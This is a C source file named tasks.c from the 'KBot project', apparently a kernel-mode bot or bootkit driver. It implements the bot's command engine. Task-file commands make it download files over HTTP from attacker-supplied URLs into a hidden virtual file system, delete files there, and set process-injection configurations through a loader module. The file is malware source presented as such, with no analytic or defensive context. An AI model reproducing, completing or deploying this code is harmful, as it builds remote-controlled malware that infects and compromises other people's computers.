//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KBot project.
//	
// module: tasks.c
// $Revision: 35 $
// $Date: 2012-08-23 16:20:51 +0400 (Чт, 23 авг 2012) $
// description: 
//	Tasks processing engine.

#include <Ntifs.h>
#include <ntddk.h>
#include <ntimage.h>
#define NTSTRSAFE_NO_DEPRECATE
#include <ntstrsafe.h>

#include "version.h"
#include "ntddkex.h"
#include "kdbg.h"
#include "bklib.h"

#include "..\fslib\fslib.h"
#include "..\bkdrv\bkdrv.h"

#include "..\kloader\kloader.h"

#include "kbot.h"
#include "kbotinc.h"
#include "tasks.h"


//
//	Processes LOAD_FILE command.
//	Loads a file by HTTP from the specified URL and saves it into the VFS with the specified name.
//
static NTSTATUS CmdLoadFile(
	PCHAR CmdLine
	)
{
	PCHAR	Buffer, Host, Uri, URL = NULL, Name = NULL;
	ULONG	bSize, NumberParams = ParseCommandLine(CmdLine, &URL, &Name, NULL, NULL);
	NTSTATUS	ntStatus = STATUS_INVALID_PARAMETER;
	ANSI_STRING	aName;

	do	// not a loop
	{
		if (NumberParams == 0)
			break;

		if (Name == NULL || *Name == 0)
		{
			if (Name = strrchr(URL, '/'))
				Name += 1;
		}

		if (!Name)
			break;

		// Splitting URL into Host and URI
		if (Uri = strchr(URL, '/'))
		{			
			if (Uri[1] == '/')
			{				
				URL = Uri + 2;
				Uri = strchr(URL, '/');
			}

			if (!Uri)
				break;
		}	// if (Uri = strchr(URL, '/'))
		else
			break;

		if (!(Host = KBotAlloc((ULONG)(Uri - URL) + 1)))
		{
			ntStatus = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		*Uri = 0;
		strcpy(Host, URL);
		*Uri = '/';

		ntStatus = KBotRequest(Host, Uri, szGet, &Buffer, &bSize);
		KBotFree(Host);

		if (!NT_SUCCESS(ntStatus) || bSize == 0)
			break;

		RtlInitAnsiString(&aName, Name);
		ntStatus = FsSaveFile(&aName, Buffer, bSize);

		KBotFree(Buffer);

	} while(FALSE);

	return(ntStatus);
}
/*
static BOOL WriteAllBytes( const char* fileName, char* data, int c_data )
{
	UNICODE_STRING uniFileName;
	OBJECT_ATTRIBUTES attr;
	WCHAR wFileName[260];
	HANDLE file;
	IO_STATUS_BLOCK ioStatus;
	NTSTATUS ntStatus;

	RtlStringCbPrintfW( wFileName, sizeof(wFileName), L"\\??\\%s\\", fileName );
	RtlInitUnicodeString( &uniFileName, wFileName );
	InitializeObjectAttributes( &attr, &uniFileName, OBJ_CASE_INSENSITIVE, 0, 0 );
	ntStatus = ZwCreateFile( &file, GENERIC_WRITE, &attr, &ioStatus, 0, FILE_ATTRIBUTE_NORMAL, 0, FILE_SUPERSEDE, 0, 0, 0 );
	if( ntStatus == STATUS_SUCCESS )
	{
		return TRUE;
	}
	return FALSE;
}

static NTSTATUS CmdReadFile( PCHAR CmdLine	)
{
	PCHAR nameFile, name;
	ULONG NumberParams;
	NTSTATUS ntStatus = STATUS_INVALID_PARAMETER;
	char tempFolder[260];
	int lenTempFolder;

	NumberParams = ParseCommandLine(CmdLine, &nameFile, &name, NULL, NULL);

//	lenTempFolder = GetTempPathA( sizeof(tempFolder), tempFolder );
//	LoadLibraryA("kernel32.dll");
	if( lenTempFolder )
	{

	}
	//FsRtlGetFileSize
	return ntStatus;
}
*/
// 
//	Processes DELETE_FILE command.
//	Deletes the specified file from the VFS.
//
static NTSTATUS CmdDeleteFile(
	PCHAR CmdLine
	)
{
	NTSTATUS	ntStatus = STATUS_INVALID_PARAMETER;
	PCHAR		Name = NULL;
	ULONG		NumberParams = ParseCommandLine(CmdLine, &Name, NULL, NULL, NULL);
	ANSI_STRING	aName;

	if (NumberParams != 0 && Name != NULL && *Name != 0)
	{
		RtlInitAnsiString(&aName, Name);
		ntStatus = FsDeleteFile(&aName);
	}

	return(ntStatus);
}


static NTSTATUS CmdSetInject(
	PCHAR CmdLine
	)
{
	return(KldrAddInjectConfig(CmdLine));
}


static NTSTATUS ProcessCommandLine(
	PCHAR CmdLine
	)
{
	PCHAR	Command, Parameters = NULL;
	ULONG	CmdLen;
	ULONG	CmdHash = 0;
	NTSTATUS	ntStatus = STATUS_INVALID_PARAMETER;

	KdPrint(("KBOT: processing command line \"%s\"\n", CmdLine));

	do	// not a loop
	{
		if (!ParseCommandLine(CmdLine, &Command, &Parameters, NULL, NULL) || Parameters == NULL)
			break;

		strtrim(Parameters, " =");
		CmdLen = strlen(Command);
		CmdHash = BkCRC32(Command, CmdLen);

		switch(CmdHash)
		{
		case CRC_LOAD_FILE:
			ntStatus = CmdLoadFile(Parameters);
			break;
		case CRC_DELETE_FILE:
			ntStatus = CmdDeleteFile(Parameters);
			break;
		case CRC_SET_INJECT:
			ntStatus = CmdSetInject(Parameters);
			break;
		case CRC_READ_FILE:
//			ntStatus = CmdReadFile(Parameters);
			break;
		default:
			KdPrint(("KBOT: Unknown command\n"));
			break;
		}	// switch(CmdHash)
		
	} while(FALSE);

//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if _DBG
	if (NT_SUCCESS(ntStatus))
		KdPrint(("KBOT: command processed\n"));
	else if (ntStatus == STATUS_INVALID_PARAMETER)
		KdPrint(("KBOT: invalid command line\n"));
	else
		KdPrint(("KBOT: command failed, status: %x\n", ntStatus));
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

	return(ntStatus);
}


NTSTATUS ProcessTaskFile(
	PCHAR	Buffer, 
	ULONG	bSize,
	BOOL	bMustSucceed
	)
{
	PCHAR NewBuffer, CmdLine;
	ULONG i = 0;
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;

	// Allocating new buffer for the task file and adding extra NULL-chat to it's end.
	if (NewBuffer = KBotAlloc(bSize + 1))
	{
		memcpy(NewBuffer, Buffer, bSize);
		NewBuffer[bSize] = 0;

		Buffer = NewBuffer;
		CmdLine = NewBuffer;

		while(Buffer[i])
		{
			while(Buffer[i])
			{	// check if there are end of line (EOFL) chars
				if (Buffer[i] == 10 || Buffer[i] == 13)
				{	// replace all EOFL chars with 0
					do
					{
						Buffer[i] = 0;
						i+=1;
					} while(Buffer[i] == 10 || Buffer[i] == 13);
					break;
				}	
				i+=1;
			}	// while(CmdStrings[i])

			CmdLine = strtrim(CmdLine, " \t");
			if (*CmdLine != ';')
			{
				// Process single command
				ntStatus = ProcessCommandLine(CmdLine);
				if (!NT_SUCCESS(ntStatus) && bMustSucceed)
					break;
			}
			CmdLine = &Buffer[i];
		}	// while(CmdStrings[i])
		KBotFree(NewBuffer);
	}	// if (CmdLine = KBotAlloc(bSize + 1))	

	return(ntStatus);
}